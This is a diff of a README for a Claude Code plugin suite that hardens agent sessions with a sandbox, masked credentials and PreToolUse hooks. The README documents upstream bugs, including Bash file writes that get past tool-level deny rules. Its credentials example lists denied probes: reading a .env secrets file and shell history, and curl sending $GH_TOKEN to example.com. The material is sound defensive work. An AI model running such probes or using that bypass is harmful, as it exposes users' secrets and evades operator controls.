@@ -1,32 +1,22 @@
 # TheConstruct: Secure Agentic Coding Infra
 **Claude Code Plugins: Sandboxed automations, masked credentials, deterministic conventions, and more**
-> known issues (use `/operator:upstream` to generate a fresh report):
-> go-based clis (`gh`, `terraform`, `kubectl`) cannot reach injectHosts domains on macos
-> [(#26466)](https://github.com/anthropics/claude-code/issues/26466);
-> the sandbox ca never loads and there is no supported fix since `allowMachLookup` is not passed through
-> [(#82793)](https://github.com/anthropics/claude-code/issues/82793);
-> use `curl`, node, python, or `git` (https) since injected `GIT_SSH_COMMAND` omits proxy credentials
-> [(#82255)](https://github.com/anthropics/claude-code/issues/82255);
-> the excludedCommands workaround is broken
-> [(#82109)](https://github.com/anthropics/claude-code/issues/82109)
-> and overpermissive
-> [(#81157)](https://github.com/anthropics/claude-code/issues/81157).
 
 ```
 TABLE OF CONTENTS
 ├─ Features ─────── operator · gitgud · retardify · hooks
+├─ Issues ───────── github cli · bash writes · hook matchers · context injection
 ├─ Examples ─────── operator:credentials · gitgud:deliver · retardify:graph
 ├─ Setup & Config
 ├─ Installation ─── individual · team · clone
 ├─ Sandbox ──────── basic · advanced
 ├─ Plugins & Skills
-├─ /operator ────── upstream · setup · settings · permissions · scripts · credentials
+├─ /operator ────── upstream · setup · settings · permissions · scripts · credentials · context · hooks · logs
 ├─ /gitgud ──────── audit · issues · backup · continue · deliver · prune · nuke · rerun · ship
-├─ /retardify ───── file · code · output · plan · graph · research · quiz · manual · review · log · todo
+├─ /retardify ───── output · code · file · research · graph · plan · guide · quiz · review · todo
 ├─ Hooks & Actions
 ├─ /sessionstart ── inject-readme · inject-log · inject-changes · inject-support
 ├─ /stop ────────── retardify-output · synthesize-log
-├─ /pretooluse ──── block-policy-edits · block-destructive-git · block-outside-moves · suggest-allow-rules
+├─ /pretooluse ──── block-protected-paths · block-destructive-git · block-outside-moves · suggest-allow-rules
 ├─ /posttooluse ─── eslint · retardify-code · retardify-file
 ├─ /taskcompleted ─ append-log
 ├─ Styles ───────── output style · subagent style
@@ -38,17 +28,110 @@ TABLE OF CONTENTS
 
 | /operator                    | /gitgud                | /retardify             | hooks                           |
 |------------------------------|------------------------|------------------------|---------------------------------|
-| [:upstream](#upstream)       | [:audit](#audit)       | [:file](#file)         | [sessionstart](#sessionstart)   |
+| [:upstream](#upstream)       | [:audit](#audit)       | [:output](#output)     | [sessionstart](#sessionstart)   |
 | [:setup](#setup)             | [:issues](#issues)     | [:code](#code)         | [stop](#stop)                   |
-| [:settings](#settings)       | [:backup](#backup)     | [:output](#output)     | [pretooluse](#pretooluse)       |
-| [:permissions](#permissions) | [:continue](#continue) | [:plan](#plan)         | [posttooluse](#posttooluse)     |
+| [:settings](#settings)       | [:backup](#backup)     | [:file](#file)         | [pretooluse](#pretooluse)       |
+| [:permissions](#permissions) | [:continue](#continue) | [:research](#research) | [posttooluse](#posttooluse)     |
 | [:scripts](#scripts)         | [:deliver](#deliver)   | [:graph](#graph)       | [taskcompleted](#taskcompleted) |
-| [:credentials](#credentials) | [:prune](#prune)       | [:research](#research) |                                 |
-|                              | [:nuke](#nuke)         | [:quiz](#quiz)         |                                 |
-|                              | [:rerun](#rerun)       | [:manual](#manual)     |                                 |
-|                              | [:ship](#ship)         | [:review](#review)     |                                 |
-|                              |                        | [:log](#log)           |                                 |
+| [:credentials](#credentials) | [:prune](#prune)       | [:plan](#plan)         |                                 |
+| [:context](#context)         | [:nuke](#nuke)         | [:guide](#guide)       |                                 |
+| [:hooks](#hooks)             | [:rerun](#rerun)       | [:quiz](#quiz)         |                                 |
+| [:logs](#logs)               | [:ship](#ship)         | [:review](#review)     |                                 |
 |                              |                        | [:todo](#todo)         |                                 |
+
+## ISSUES
+> current known [upstream issues](https://github.com/anthropics/claude-code/issues) and the workarounds applied in this plugin suite (use `/operator:upstream` to refresh report)
+
+### GitHub CLI
+> go-based clis (`gh`, `terraform`, `kubectl`) cannot reach injectHosts domains on macos
+> [(#26466)](https://github.com/anthropics/claude-code/issues/26466);
+> the sandbox ca never loads and there is no supported fix since `allowMachLookup` is not passed through
+> [(#82793)](https://github.com/anthropics/claude-code/issues/82793);
+> `git push` fails over https too, since the credential mask substitutes on `api.github.com` only,
+> and only inside an `Authorization: Bearer` header, never on `github.com`;
+> ssh fails for its own reason, since the injected `GIT_SSH_COMMAND` omits proxy credentials
+> [(#82255)](https://github.com/anthropics/claude-code/issues/82255).
+
+WORKAROUND
+- `/gitgud` skills run every write as `curl`, node or python against `api.github.com`
+- keeps `git` for local history and for reads, which authenticate anonymously
+
+VERIFIED
+- 2026-08-15: sandboxed, masked token, no exclusions, no human click
+
+| step        | method                               | result                       |
+|-------------|--------------------------------------|------------------------------|
+| read head   | `GET /git/ref/heads/main`            | parent sha                   |
+| stage files | `POST /git/blobs` per file           | one blob sha each            |
+| build tree  | `POST /git/trees` with `base_tree`   | one tree sha, many files     |
+| commit      | `POST /git/commits` with parent      | one atomic multi-file commit |
+| branch      | `POST /git/refs`                     | `refs/heads/<branch>`        |
+| open pr     | `POST /pulls`                        | `verify` on `pull_request`   |
+| merge       | graphql `enablePullRequestAutoMerge` | merged, branch auto-deleted  |
+
+### Bash Writes
+> bash file writes (`cp`, `tee`, `heredocs`, `redirects`) bypass tool-scoped `Edit/Write` deny rules;
+> `manual mode` doesn't review file content written through Bash
+> [(#84776)](https://github.com/anthropics/claude-code/issues/84776);
+> the matcher reads a compound command as one string, so per-component rules never apply
+> [(#16561)](https://github.com/anthropics/claude-code/issues/16561);
+> deny reliability is a 30-issue meta thread, focuses on PreToolUse hooks as a failover
+> [(#30519)](https://github.com/anthropics/claude-code/issues/30519) and
+> [(#61268)](https://github.com/anthropics/claude-code/issues/61268).
+
+WORKAROUND
+- `commands.sh` splits compound bash commands into testable segments
+- `PreToolUse` hook actions check every command segment before execution
+- see `block-protected-paths.sh`, `block-destructive-git.sh`, `block-outside-moves.sh`
+
+VERIFIED
+- 2026-08-16: `/operator:permissions` evaluates `corpus.tsv` against all `PreToolUse` hook actions
+
+| cases        | owner           | expected | result     |
+|--------------|-----------------|----------|------------|
+| 45 dangerous | merged settings | denied   | 45 denied  |
+| 34 dangerous | pretooluse hook | blocked  | 34 blocked |
+| 22 ordinary  | none            | ignored  | 22 ignored |
+
+### Hook Matchers
+> one schema-invalid matcher in hooks.json or settings.json silently breaks every hook in that scope
+> [(#75081)](https://github.com/anthropics/claude-code/issues/75081);
+> an interactive session dialogs the error at startup, while `claude -p` drops the file in silence.
+
+WORKAROUND
+- `/operator:hooks` checks for schema validity and proves hooks are live in every ci run
+
+VERIFIED
+- 2026-08-16: three settings files replayed through `claude -p` on 2.1.221, one marker hook each
+
+| step        | method                                | result                       |
+|-------------|---------------------------------------|------------------------------|
+| control     | a file with two valid hooks           | marker written, hooks live   |
+| break it    | one matcher set to `{"type":"always"}` | no marker, every hook dead   |
+| bare star   | one matcher set to `"*"`              | marker written, still loads  |
+| stderr      | grep the `-p` run for hook or matcher | nothing, the drop is silent  |
+| detect it   | `/operator:hooks <file>` on all three | 1 error, 1 warn, 1 clean     |
+| this suite  | `/operator:hooks`                     | 8 scopes, 5 groups, 0 errors |
+
+### Context Injection
+> hook injection past 10,000 chars never reaches context
+> [(#84021)](https://github.com/anthropics/claude-code/issues/84021) and
+> a payload over the cap (not configurable) is truncated to a 2KB preview instead
+> [(#51537)](https://github.com/anthropics/claude-code/issues/51537).
+
+WORKAROUND
+- `SessionStart` hook actions cap injected payloads and summarize any cuts
+- see `inject-readme.sh`, `inject-log.sh`, `inject-changes.sh`, `inject-support.sh`
+
+VERIFIED
+- 2026-08-16: `/operator:context` measured at the hook boundary
+
+| injected context  | bytes  | cap     | landed | summary |
+|-------------------|--------|---------|--------|---------|
+| inject-readme.sh  | 88,287 | 9,500   | 9,066  | 71 chs  |
+| inject-log.sh     | 8,467  | 9,500   | 8,255  | x chs   |
+| inject-changes.sh | 2,093  | 20 rows | 1,649  | 1 row   |
+| inject-support.sh | 547    | none    | 443    | none    |
 
 ## Examples
 
@@ -83,8 +166,8 @@ TABLE OF CONTENTS
 # verbose transport  $ curl -v -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/user
                      > Authorization: Bearer fake_value_5a09…kcde
 # ── DENIED ──────────────────────────────────────────────────────────────────────────────────────
-# source file        $ cat ~/.operator/.env
-                     cat: /Users/…/.operator/.env: Operation not permitted
+# source file        $ cat ~/.construct/.env
+                     cat: /Users/…/.construct/.env: Operation not permitted
 # network exfil      $ curl "https://example.com/?t=$GH_TOKEN"
                      000
 # shell history      $ cat ~/.zsh_history
@@ -95,7 +178,7 @@ TABLE OF CONTENTS
                      000
 # process table      $ ps eww $$
                      operation not permitted: ps
-# harness read tool  Read(~/.operator/.env)
+# harness read tool  Read(~/.construct/.env)
                      denied by your permission settings
 ```
 
@@ -328,9 +411,9 @@ claude
 # 1. make secure directory in your home directory
 mkdir -p ~/.operator && chmod 700 ~/.operator
 # 2. make secure file for your masked credentials
-touch ~/.operator/.env && chmod 600 ~/.operator/.env
-# 3. append source command to shell config
-echo '[ -r ~/.operator/.env ] && source ~/.operator/.env' >> ~/.zshrc
+touch ~/.construct/.env && chmod 600 ~/.construct/.env
+# 3. append source command to shell config (or nano ~/.zshrc)
+echo '[ -r ~/.construct/.env ] && source ~/.construct/.env' >> ~/.zshrc
 ```
 ```
 # 4. restart code editor and claude tui
@@ -340,10 +423,10 @@ claude
 
 # example instructions:
 # [ ] deny: any exposed credentials from `env | grep -iE 'key|token|secret'` via `sandbox.credentials.envVars`
-# [ ] deny: access to `~/.operator/.env` via `sandbox.credentials.files`
-# [ ] rotate: personal access tokens one-at-a-time, updating `~/.operator/.env` as needed
-# [ ] export: non-exposed credentials in `~/.operator/.env` (e.g. `export GH_TOKEN="github_pat_123"`)
-# [ ] mask: exported credentials from `~/.operator/.env` via `sandbox.credentials.envVars` (requires injectHosts)
+# [ ] deny: access to `~/.construct/.env` via `sandbox.credentials.files`
+# [ ] rotate: personal access tokens one-at-a-time, updating `~/.construct/.env` as needed
+# [ ] export: non-exposed credentials in `~/.construct/.env` (e.g. `export GH_TOKEN="github_pat_123"`)
+# [ ] mask: exported credentials from `~/.construct/.env` via `sandbox.credentials.envVars` (requires injectHosts)
 # [ ] allow: network access to each masked host via `sandbox.network.allowedDomains`
 
 # 6. check your live sandbox settings
@@ -385,12 +468,62 @@ metadata:
 - probes your machine's state and maps out a detailed roadmap all the way through
 - interactive questionnaire helps you decide which sandbox config is right for you
 - ends with a clean `--audit` handoff that makes sure everything is fully secure
-  - runs settings, permissions, scripts, credentials and upstream, then keeps each output whole
+  - runs settings, permissions, hooks, scripts, credentials, context and upstream, keeping each whole
   - recomputes no verdict; each lens grades itself and this collects what they returned
   - correlates across lenses, which no single lens can do from inside itself
   - takes no lens flag, since one lens belongs to its own skill and its own artifact
   - prices the run against the sidecars it would replay, and asks before spending any of it
   - costs minutes, and names the seconds each lens spent so a long stage reads as work
+
+#### Context
+```
+/operator:context
+```
+```yaml
+---
+name: context
+model: opus
+effort: max
+license: MIT
+compatibility: requires bash, jq, git
+description: prove what literally reached this session's context, read from its transcript (saves report to .construct/)
+argument-hint: "[--help] [--quick] [--strict] [--keep]"
+disable-model-invocation: true
+disallowed-tools: WebFetch, WebSearch
+metadata:
+  kind: trigger
+  artifact: .construct/operator/context/
+---
+```
+**provable context:** ensure the payload each hook emitted is the payload that actually landed
+- answers one question: did what a hook declared reach context, byte for byte
+- a hook can run, exit 0 and print perfectly, and still inject nothing once it passes the cap
+- reads the session's own transcript, so a drop is measured rather than inferred from a replay
+
+#### Hooks
+```
+/operator:hooks
+```
+```yaml
+---
+name: hooks
+model: opus
+effort: max
+license: MIT
+compatibility: requires bash, jq, git
+description: prove every hook loads, resolves and fires, before a silent scope drop hides one (saves report to .construct/)
+argument-hint: "[--help] [--quick] [--strict] [--keep] [<file>...]"
+disable-model-invocation: true
+disallowed-tools: WebFetch, WebSearch
+metadata:
+  kind: trigger
+  artifact: .construct/operator/hooks/
+---
+```
+**provable hooks:** ensure every hook this machine registers is one the harness will actually load
+- answers one question: is a hook block loadable, resolvable and proven to have run
+- one matcher of the wrong type makes the harness skip that whole file, every event inside it
+- an interactive session dialogs that; `claude -p` drops the file and says nothing at all
 
 #### Credentials
 ```
@@ -533,6 +666,28 @@ metadata:
 - fetches every cited claude-code issue with plain curl, since the sandbox breaks `gh` itself
 - topical searches (`--sandbox`, `--hooks`, `--plugins`, `--permissions`) surface new candidates
 - ends by drafting the known-issues banner update, applied only when you confirm it
+
+#### Logs
+```
+/operator:logs
+```
+```yaml
+---
+name: logs
+license: MIT
+compatibility: requires bash, git
+description: "the shape of a daily agent log: threads carrying their own notes and prompts (saves log to .construct/)"
+argument-hint: "[--help]"
+when_to_use: "Writing to .construct/operator/logs/, which the taskcompleted and stop hooks both demand before a turn closes. Also when asked to log, note or record what happened, or to recap the day's threads."
+metadata:
+  kind: spec
+  artifact: .construct/operator/logs/
+---
+```
+**today's work, shaped for tomorrow's session:** the next agent reads it instead of asking you
+- threads group work by topic, carrying their own notes and prompts
+- `inject-log` carries the four most recent threads forward across days
+- the stop hook demands it, so a turn cannot close on an unwritten day
 
 ### /gitgud
 > the whole git dance; each pairs with a `.sh` sidecar that measures, then hands the commands back
@@ -754,7 +909,7 @@ metadata:
 ---
 ```
 **abort beats a bad bump:** every release precondition checked before the version moves
-- aborts on a dirty tree, detached HEAD, stale trunk or missing production
+- aborts on a dirty tree, detached HEAD, stale trunk, missing production or drifted docs
 - computes the next version rather than applying it, since `npm version` commits
 - releases nothing; the bump, push and promote are handed over
 
@@ -762,73 +917,29 @@ metadata:
 > keeps machine output legible: what a convention is, whether the tree holds to it, and prose you can follow
 > the linters auto-load on a matching source file; the writers turn a conversation into one document
 
-#### File
+#### Output
 ```
-/retardify:file <path>
+/retardify:output
 ```
 ```yaml
 ---
-name: file
+name: output
+model: opus
+effort: high
 license: MIT
-compatibility: requires bash, git
-description: file-shape linter run by PostToolUse or via <path> argument (saves audits to .construct/)
-argument-hint: "[--help] <path>"
-when_to_use: "editing files, PostToolUse warnings, or when asked to review files"
-paths: "**/*.ts, **/*.tsx, **/*.js, **/*.jsx, **/*.mjs, **/*.cjs, **/*.sh, **/*.py, **/*.rb, **/*.go, **/*.rs"
+compatibility: requires bash, jq, git
+description: output style linter run by the stop hook, on the last reply, or via <path> argument
+argument-hint: "[--help] [<path>|-]"
+disable-model-invocation: true
 metadata:
-  kind: spec
-  artifact: .construct/retardify/file/
+  kind: trigger
 ---
 ```
-
-**validated file shapes:** keep tokens aimed at logic instead of conventions
-- `shape-only` refactors since `/retardify:code` already owns the logic inside it
-- `file name` casing is configured and enforced mechanistically
-- `wayfinders` improve code orientation and help keep inline comments to a minimum
-- `module` organization is standardized for maximum scannability
-- `inline comments` are continually synthesized to ensure they're accurate and legible
-- `configured` in the skill doc and enforced by the bash sidecar
-
-<details>
-<summary>example:</summary>
-
-```typescript
-/**
- * =================================================
- * @file widget.ts - generic stateful execution unit
- * =================================================
- * @description
- * - wraps arbitrary payloads into standard lifecycle hooks (init, tick, dispose)
- * - NOTES:
- *   - #1: mutations funnel through internal queue to ensure deterministic ticks
- * @see core/runner.ts
- */
-
-import { fetchFooCache } from "some-library";
-import type { FooConfig } from "some-library";
-
-import { getFoo } from "@/utilities/foo";
-import type { FooBarShape } from "@/utilities/foobar";
-import { FOO_URL, FOO_API_KEY } from "@/config/foobar";
-import FooWidget from "@/modules/foo/Widget";
-import "@/modules/foo/Widget.css";
-
-export { helperFn } from "@/utilities/shared";
-
-export const FOO_TAG = "foo-tag";
-export const FOO_LIST = ["a", "b", "c"];
-
-const FOO_TIMER = 3600;
-
-export type FooNode = { path: string; type: string };
-
-export async function getFoo(): Promise<FooNode[]> { return []; }
-
-// full-line comments only, closed with a type hint when helpful – boolean
-// comments that span more than 2 consecutive lines belong in the wayfinder
-```
-
-</details>
+**every reply is linted:** against the output style rules to keep conversations consistent
+- a plain run grades the last reply, read from this session's own transcript
+- used by the `retardify-output.sh` `stop` hook automatically but can be used manually for debugging
+- grades the mechanically checkable rules like markup, constraints, shapes, etc
+- blocks on HARD findings and quotes the offending line so the fix is mechanical
 
 #### Code
 ```
@@ -928,76 +1039,73 @@ export function writeCode(requirements: Requirement[], request: string) {
 
 </details>
 
-#### Output
+#### File
 ```
-/retardify:output
+/retardify:file <path>
 ```
 ```yaml
 ---
-name: output
-model: opus
-effort: high
+name: file
 license: MIT
 compatibility: requires bash, git
-description: output style linter run by the stop hook or via <path> argument
-argument-hint: "[--help] <path>|-"
-disable-model-invocation: true
+description: file-shape linter run by PostToolUse or via <path> argument (saves audits to .construct/)
+argument-hint: "[--help] <path>"
+when_to_use: "editing files, PostToolUse warnings, or when asked to review files"
+paths: "**/*.ts, **/*.tsx, **/*.js, **/*.jsx, **/*.mjs, **/*.cjs, **/*.sh, **/*.py, **/*.rb, **/*.go, **/*.rs"
 metadata:
-  kind: trigger
+  kind: spec
+  artifact: .construct/retardify/file/
 ---
 ```
-**every reply is linted:** against the output style rules to keep conversations consistent
-- used by the `retardify-output.sh` `stop` hook automatically but can be used manually for debugging
-- grades the mechanically checkable rules like markup, constraints, shapes, etc
-- blocks on HARD findings and quotes the offending line so the fix is mechanical
 
-#### Plan
-```
-/retardify:plan
-```
-```yaml
----
-name: plan
-model: opus
-effort: max
-license: MIT
-compatibility: requires bash, curl, git
-description: turn work into a staged plan with per-stage readiness tables, then validate it (saves plan to .construct/)
-argument-hint: "[--help] [--confirm] <goal|path to a spec or brief>"
-disable-model-invocation: true
-metadata:
-  kind: trigger
-  artifact: .construct/retardify/plan/
----
-```
-**big work gets staged before it starts:** one PR per stage, ordered once instead of mid-build
-- written before complex or architectural work, never after it
-- the checklist is the deliverable, and readiness is what gates it
-- a stage nobody can run is a stage that does not start
+**validated file shapes:** keep tokens aimed at logic instead of conventions
+- `shape-only` refactors since `/retardify:code` already owns the logic inside it
+- `file name` casing is configured and enforced mechanistically
+- `wayfinders` improve code orientation and help keep inline comments to a minimum
+- `module` organization is standardized for maximum scannability
+- `inline comments` are continually synthesized to ensure they're accurate and legible
+- `configured` in the skill doc and enforced by the bash sidecar
 
-#### Graph
+<details>
+<summary>example:</summary>
+
+```typescript
+/**
+ * =================================================
+ * @file widget.ts - generic stateful execution unit
+ * =================================================
+ * @description
+ * - wraps arbitrary payloads into standard lifecycle hooks (init, tick, dispose)
+ * - NOTES:
+ *   - #1: mutations funnel through internal queue to ensure deterministic ticks
+ * @see core/runner.ts
+ */
+
+import { fetchFooCache } from "some-library";
+import type { FooConfig } from "some-library";
+
+import { getFoo } from "@/utilities/foo";
+import type { FooBarShape } from "@/utilities/foobar";
+import { FOO_URL, FOO_API_KEY } from "@/config/foobar";
+import FooWidget from "@/modules/foo/Widget";
+import "@/modules/foo/Widget.css";
+
+export { helperFn } from "@/utilities/shared";
+
+export const FOO_TAG = "foo-tag";
+export const FOO_LIST = ["a", "b", "c"];
+
+const FOO_TIMER = 3600;
+
+export type FooNode = { path: string; type: string };
+
+export async function getFoo(): Promise<FooNode[]> { return []; }
+
+// full-line comments only, closed with a type hint when helpful – boolean
+// comments that span more than 2 consecutive lines belong in the wayfinder
 ```
-/retardify:graph
-```
-```yaml
----
-name: graph
-model: opus
-effort: max
-license: MIT
-compatibility: requires bash, git
-description: turn a goal into a fan-out spec prompt for a fresh session, then validate it (saves spec to .construct/)
-argument-hint: "[--help] <goal>"
-disable-model-invocation: true
-metadata:
-  kind: trigger
-  artifact: .construct/retardify/graph/
----
-```
-**a prompt built for a fresh session:** constraints written down, fan-out on your go
-- a spec states constraints, never plan steps
-- writes one file and stops; the fan-out begins only on your explicit go
-- the checkboxes belong to whatever it produces, never to the spec
+
+</details>
 
 #### Research
 ```
@@ -1023,6 +1131,78 @@ metadata:
 - the repo is probed first, so the answer is reconciled rather than recited
 - rounds continue while a round still finds a source the last one missed
 
+#### Graph
+```
+/retardify:graph
+```
+```yaml
+---
+name: graph
+model: opus
+effort: max
+license: MIT
+compatibility: requires bash, git
+description: turn a goal into a fan-out spec prompt for a fresh session, then validate it (saves spec to .construct/)
+argument-hint: "[--help] <goal>"
+disable-model-invocation: true
+metadata:
+  kind: trigger
+  artifact: .construct/retardify/graph/
+---
+```
+**a prompt built for a fresh session:** constraints written down, fan-out on your go
+- a spec states constraints, never plan steps
+- writes one file and stops; the fan-out begins only on your explicit go
+- the checkboxes belong to whatever it produces, never to the spec
+
+#### Plan
+```
+/retardify:plan
+```
+```yaml
+---
+name: plan
+model: opus
+effort: max
+license: MIT
+compatibility: requires bash, curl, git
+description: turn work into a staged plan with per-stage readiness tables, then validate it (saves plan to .construct/)
+argument-hint: "[--help] [--confirm] <goal|path to a spec or brief>"
+disable-model-invocation: true
+metadata:
+  kind: trigger
+  artifact: .construct/retardify/plan/
+---
+```
+**big work gets staged before it starts:** one PR per stage, ordered once instead of mid-build
+- written before complex or architectural work, never after it
+- the checklist is the deliverable, and readiness is what gates it
+- a stage nobody can run is a stage that does not start
+
+#### Guide
+```
+/retardify:guide
+```
+```yaml
+---
+name: guide
+model: fable
+effort: max
+license: MIT
+compatibility: requires bash, git
+description: distill a completed plan into a perfect-world build guide, then validate it (saves guide to .construct/)
+argument-hint: "[--help] <plan>"
+disable-model-invocation: true
+metadata:
+  kind: trigger
+  artifact: .construct/retardify/guide/
+---
+```
+**the messy build rewritten as the ideal path:** every dead end stays back in the plan
+- distills a closed plan into the build as it goes when every step lands clean
+- imperative, sorted, maximally concise; the dead ends stay in the plan
+- assumes the likeliest case at every fork, so edge cases never make the page
+
 #### Quiz
 ```
 /retardify:quiz
@@ -1046,30 +1226,6 @@ metadata:
 - a study map in build order, then 20 questions written against the code
 - generation ships NO answers, and a second run grades what you ticked
 - every miss names the transferable concept underneath it, not just the letter
-
-#### Manual
-```
-/retardify:manual
-```
-```yaml
----
-name: manual
-model: fable
-effort: max
-license: MIT
-compatibility: requires bash, git
-description: distill a completed plan into a perfect-world build manual, then validate it (saves manual to .construct/)
-argument-hint: "[--help] <plan>"
-disable-model-invocation: true
-metadata:
-  kind: trigger
-  artifact: .construct/retardify/manual/
----
-```
-**the messy build rewritten as the ideal path:** every dead end stays back in the plan
-- distills a closed plan into the build as it goes when every step lands clean
-- imperative, sorted, maximally concise; the dead ends stay in the plan
-- assumes the likeliest case at every fork, so edge cases never make the page
 
 #### Review
 ```
@@ -1095,28 +1251,6 @@ metadata:
 - strictly read-only, and it never flatters the user
 - punishes hand-wavy conventions and unearned "green ci" claims
 - produces a graded scorecard saved to file, not a chat reply
-
-#### Log
-```
-/retardify:log
-```
-```yaml
----
-name: log
-license: MIT
-compatibility: requires bash, git
-description: "the shape of a daily agent log: threads carrying their own notes and prompts (saves log to .construct/)"
-argument-hint: "[--help]"
-when_to_use: "Writing to .construct/retardify/log/, which the taskcompleted and stop hooks both demand before a turn closes. Also when asked to log, note or record what happened, or to recap the day's threads."
-metadata:
-  kind: spec
-  artifact: .construct/retardify/log/
----
-```
-**today's work, shaped for tomorrow's session:** the next agent reads it instead of asking you
-- threads group work by topic, carrying their own notes and prompts
-- `inject-log` carries the four most recent threads forward across days
-- the stop hook demands it, so a turn cannot close on an unwritten day
 
 #### Todo
 ```
@@ -1182,7 +1316,7 @@ description: injects the newest log threads into opening context, and stubs toda
 ```
 
 **yesterday never needs re-explaining:** the newest threads carry forward across days
-- depends on the retardify plugin for `/retardify:log`'s budget, and defaults to 4 threads without it
+- depends on no sibling plugin; reads `/operator:logs`'s budget, and defaults to 4 threads without it
 - injects the newest threads whole, dropping the oldest until the payload fits its cap
 - stubs today's log file, the one action that still does; the demand actions rely on that stub
 - costs one process spawn per session start, plus one budget read
@@ -1255,7 +1389,7 @@ description: blocks a closing turn while today's log carries pending notes or ov
 ```
 
 **a day of notes ends synthesized:** the log's state decides when, never a clock alone
-- depends on the retardify plugin's log spec and byte budget, `/retardify:log`
+- depends on no sibling plugin; takes the log spec and byte budget from `/operator:logs`
 - greppable state decides: pending notes and oversized threads, debounced five minutes
 - an hourly full pass backstops what no grep can see; a missing log asks for nothing
 - costs one process spawn and a few greps per turn end
@@ -1263,13 +1397,13 @@ description: blocks a closing turn while today's log carries pending notes or ov
 ### pretooluse
 > fires before every Bash call; each action reads the whole command string and can deny or annotate it
 
-#### pretooluse/block-policy-edits
+#### pretooluse/block-protected-paths
 ```
-plugins/operator/hooks/pretooluse/block-policy-edits.sh
+plugins/operator/hooks/pretooluse/block-protected-paths.sh
 ```
 ```yaml
 ---
-name: block-policy-edits
+name: block-protected-paths
 description: denies bash writers, heredocs and redirects aimed at settings, hooks and other policy paths
 ---
 ```
@@ -1406,7 +1540,7 @@ description: blocks a completing task until a note lands in today's log, and doe
 ```
 
 **the log is a precondition, not a chore:** no task closes on unwritten work
-- depends on the retardify plugin's log spec for the note's shape, `/retardify:log`
+- depends on no sibling plugin; takes the note's shape from `/operator:logs`
 - blocks with the ask; the agent is what writes, which is why the name says demand
 - a missing log file is treated as nothing, since `inject-log` owns the stub
 - costs one process spawn per completed task
